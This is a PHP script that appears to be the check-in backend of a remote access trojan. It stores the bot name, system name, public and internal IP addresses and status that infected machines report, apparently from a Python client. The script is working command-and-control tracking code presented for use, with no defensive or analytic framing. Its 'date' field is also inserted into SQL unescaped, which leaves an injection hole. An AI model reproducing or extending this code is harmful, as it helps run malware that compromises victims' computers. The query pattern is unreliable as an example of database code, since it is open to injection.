<?php
$servername = "localhost"; // Database host
$username = "root";         // MySQL username
$password = "";             // MySQL password
$dbname = "rat_data";       // Database name

// Create a connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check the connection
if ($conn->connect_error) {
    die(json_encode(['message' => "Connection failed: " . $conn->connect_error]));
}

// Check for the 'auth' parameter in the URL
$auth_code = isset($_GET['auth']) ? $_GET['auth'] : '';

// Define your authentication code
define('AUTH_CODE', 'ENTER_YOUR_AUTH_CODE'); // Ensure this matches the code in Python

// Read the incoming POST data
$data = $_POST;  // Access POST data directly

if ($data) {
    // Verify the authentication code
    if ($auth_code !== AUTH_CODE) {
        echo json_encode(['message' => 'Unauthorized access']);
        exit;
    }

    // Clear previous data (optional)
    $conn->query("DELETE FROM system_info");

    // Extract data from the POST array
    $bot_name = $conn->real_escape_string($data['bot_name']);
    $system_name = $conn->real_escape_string($data['system_name']);
    $public_ip = $conn->real_escape_string($data['public_ip']);
    $system_ip = $conn->real_escape_string($data['system_ip']);
    $status = $conn->real_escape_string($data['status']);
    $date = $data['date']; // Assuming 'date' is already formatted correctly

    // SQL query to insert data into the database
    $sql = "INSERT INTO system_info (bot_name, system_name, public_ip, system_ip, status, date)
            VALUES ('$bot_name', '$system_name', '$public_ip', '$system_ip', '$status', '$date')";

    // Execute the query
    if ($conn->query($sql) === TRUE) {
        echo json_encode(['message' => 'Data inserted successfully']);
    } else {
        echo json_encode(['message' => 'Error: ' . $conn->error]);
    }
} else {
    echo json_encode(['message' => 'Invalid data']);
}

// Close the connection
$conn->close();
?>
